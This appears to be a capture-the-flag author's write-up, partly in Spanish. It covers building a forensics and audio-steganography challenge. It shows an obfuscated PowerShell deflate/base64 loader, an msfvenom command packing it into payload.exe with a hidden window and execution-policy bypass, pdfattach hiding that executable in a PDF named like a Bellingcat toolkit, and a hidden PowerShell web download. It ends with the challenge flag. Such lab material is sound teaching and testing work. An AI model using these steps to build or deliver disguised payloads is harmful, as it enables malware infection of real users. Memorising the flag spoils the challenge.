# EXTRACT EMBED CODE | Part 1

```
sudo apt install poppler-utils
pdfattach Bellingcats-Digital-Toolkit.pdf payload.exe forensicsTools.pdf
```

Literalmente un strings mano, no me jodas
# POWERSHELL DEOBFUSCATION | Part 2

```powershell
&( $ENv:COmSPec[4,26,25]-jOiN'')( new-oBJeCT  Io.COmPResSIon.DeFLaTesTREaM([Io.MemOrySTReam] [SYStEm.coNverT]::FROmBaSe64StrinG('XVNtb9pIEP4r/lAdWGEBv2InqtRcRNvc5SiCcFEV5YODt7HvwKb24pQi/vs9g3fWuSLW87Iz8zw7O/ub1bfeTYvmcl1ul3O5fvQHLv7Bk/ijzGe9no39fu+2aL78ORXyx3wxrZd5Oevjt7qZHyfe6eiPsYLT0YN03NMxDE/HAHYM3YtPxwgxIWSANfHhp70JdMR7iHWhew5sWpQTwQfddU+9i97RRZgLl4NQD6nwOWP4IoQ4KOeQhE0IyI6IAbHC8rAdESJVw75PDIAWYREYASFsEqMmooknXEgIoEbAcigY+QRH9amOfw524MZmAFIOVabzEEGg4z8JzkEBSsHptweJqBIK03lQOyASJCEIGSbxoOZRQ6FSNorFkHQgpIcIdgkGwT5khBVSGDJCkIsJgojSMWBH4xNuSXzz//lbYA2wmvSgLDakluVWK0ppRYjvWku2B63lRKpVa46XtRppfZNopWZPinhZ4NNc3k//mi9/ulxqz8VrphAOtodwu/PxJU17D0pQI5jlqGPwmVG5gEg3nMTktFzPk6rOOewhL9LydakOG2lp3zfmEDSpxFu413bRlP8y/Bl4xyfLGavpNqV4YC6wMytoW31dvey3slB3ea2sD32cLbtFTwmrydPuQDBkuVrcWfC8t0zT0w3sHRtaHm+7rqCxWhu95CrbPw/X1Ch9Ik4EkzdF0QIOMD6eCcWdCgOtLLWc8wXjin4ZoFCIohQ8RWtZ19xbBtrVl+A8Gh3Kvdo/y6F232W3Xc8EB6e4Bkt8ZCZltU2UIfqgZR+QysBwqiyGmCJtbCWNkmnxpkzS0YHHgqt3bUGg2ZTqPIl8voxHhQHPt2vbbD4v5Pc9HoMlVlVu0SWbp0T3V1+OTB7Tv5f8inDtv4wsl13V8vfEzC4qFS+nK5oszny1xEOSc1olzXMoXwutXXH6UP6gfnDttZY/3axrEd95qPHa96w+bURSNy9fmxUKXFlLlVRKzKtSR2clQiuwgGiH6ctefdSbm10LzHdyCN+8aXrrZvIET/KhI5SozOoyTb/FrJzJV4NA3cVlWGIhd5vkZmr1H2+y6+op8C5axXEi1sZje9CqXmiJdSXnyJA6ITIJrqu1wMTHrgHoczFfR4HwxOv0eGKSQqYF95vE2AA5DOQbYr5t9+xhJXd312vZp2b1Bo/L+0U++/T0ePM5QUjc7fdbVxRctEo40UpE1P+f5tuW/R8=' ), [SYStEm.Io.COmpRESSIon.CoMPREsSIoNModE]::DecOmPREsS)| %{ new-oBJeCT  io.StrEaMrEadeR($_ ,[teXT.EnCOdIng]::ASCII)} |% {$_.REAdtOEND( ) } )

msfvenom -p windows/x64/exec CMD="powershell -WindowStyle Hidden -ExecutionPolicy Bypass -command \"&( $ENv:COmSPec[4,26,25]-jOiN'')( new-oBJeCT  Io.COmPResSIon.DeFLaTesTREaM([Io.MemOrySTReam] [SYStEm.coNverT]::FROmBaSe64StrinG('XVNtb9pIEP4r/lAdWGEBv2InqtRcRNvc5SiCcFEV5YODt7HvwKb24pQi/vs9g3fWuSLW87Iz8zw7O/ub1bfeTYvmcl1ul3O5fvQHLv7Bk/ijzGe9no39fu+2aL78ORXyx3wxrZd5Oevjt7qZHyfe6eiPsYLT0YN03NMxDE/HAHYM3YtPxwgxIWSANfHhp70JdMR7iHWhew5sWpQTwQfddU+9i97RRZgLl4NQD6nwOWP4IoQ4KOeQhE0IyI6IAbHC8rAdESJVw75PDIAWYREYASFsEqMmooknXEgIoEbAcigY+QRH9amOfw524MZmAFIOVabzEEGg4z8JzkEBSsHptweJqBIK03lQOyASJCEIGSbxoOZRQ6FSNorFkHQgpIcIdgkGwT5khBVSGDJCkIsJgojSMWBH4xNuSXzz//lbYA2wmvSgLDakluVWK0ppRYjvWku2B63lRKpVa46XtRppfZNopWZPinhZ4NNc3k//mi9/ulxqz8VrphAOtodwu/PxJU17D0pQI5jlqGPwmVG5gEg3nMTktFzPk6rOOewhL9LydakOG2lp3zfmEDSpxFu413bRlP8y/Bl4xyfLGavpNqV4YC6wMytoW31dvey3slB3ea2sD32cLbtFTwmrydPuQDBkuVrcWfC8t0zT0w3sHRtaHm+7rqCxWhu95CrbPw/X1Ch9Ik4EkzdF0QIOMD6eCcWdCgOtLLWc8wXjin4ZoFCIohQ8RWtZ19xbBtrVl+A8Gh3Kvdo/y6F232W3Xc8EB6e4Bkt8ZCZltU2UIfqgZR+QysBwqiyGmCJtbCWNkmnxpkzS0YHHgqt3bUGg2ZTqPIl8voxHhQHPt2vbbD4v5Pc9HoMlVlVu0SWbp0T3V1+OTB7Tv5f8inDtv4wsl13V8vfEzC4qFS+nK5oszny1xEOSc1olzXMoXwutXXH6UP6gfnDttZY/3axrEd95qPHa96w+bURSNy9fmxUKXFlLlVRKzKtSR2clQiuwgGiH6ctefdSbm10LzHdyCN+8aXrrZvIET/KhI5SozOoyTb/FrJzJV4NA3cVlWGIhd5vkZmr1H2+y6+op8C5axXEi1sZje9CqXmiJdSXnyJA6ITIJrqu1wMTHrgHoczFfR4HwxOv0eGKSQqYF95vE2AA5DOQbYr5t9+xhJXd312vZp2b1Bo/L+0U++/T0ePM5QUjc7fdbVxRctEo40UpE1P+f5tuW/R8=' ), [SYStEm.Io.COmpRESSIon.CoMPREsSIoNModE]::DecOmPREsS)| %{ new-oBJeCT  io.StrEaMrEadeR($_ ,[teXT.EnCOdIng]::ASCII)} |% {$_.REAdtOEND( ) } )\"" -f exe -o payload.exe
```

Well unlucky haha, you have to get:

```powershell
$yt = "$env:TEMP\yt-dlp.exe"
if (-not (Test-Path $yt)) {
    Invoke-WebRequest -Uri "https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp.exe" -OutFile $yt -UseBasicParsing
}

$videoURL = "https://youtube.com/shorts/tGl-asvgYvU" #H3K_kSa1-aM
Start-Process -WindowStyle Hidden -FilePath $yt -ArgumentList @(
    "`"$videoURL`"",
    "--format", "mp4",
    "--quiet",
    "--no-mtime",
    "-o", "$env:TEMP\system_video.mp4"
) -NoNewWindow -Wait
```
# AUDIO | Part 3

You have to extract wav from mp4, anyways here to create video with custom audio:

```bash
ffmpeg -stream_loop -1 -i video.mpeg -i HimnoYucatan.wav -shortest -c:v libx264 -c:a aac -b:a 192k output.mp4
```


Extract subpart, recomendable 4800 kHz but you can put any other kHz and it should work correctly, such as 4100, 4400,5200

```
ffmpeg -i output.mp4 -vn -acodec pcm_s16le -ar 48000 -ac 1 HimnoYucatan.wav
```

```bash
minimodem --rx 1200 -f HimnoYucatan.wav
minimodem --rx 900 -f HimnoYucatan.wav
```

![[Pasted image 20250704120125.png]]

# FLAG

```bash
AHAU{4Ud?0_st3g0_?_w1th_m4lw4w3??}


echo "AHAU{4Ud?0_st3g0_?_w1th_m4lw4w3??}" -> ZWNobyAiQUhBVXs0VWQ/MF9zdDNnMF8/X3cxdGhfbTRsdzR3Mz8/fSI=

echo "ZWNobyAiQUhBVXs0VWQ/MF9zdDNnMF8/X3cxdGhfbTRsdzR3Mz8/fSI=" | base64

Part 1: echo "ZWNobyAiQUhBVXs0VWQ/MF9zdDNnMF8/X3cx
Part 2: dGhfbTRsdzR3Mz8/fSI=" | base64
```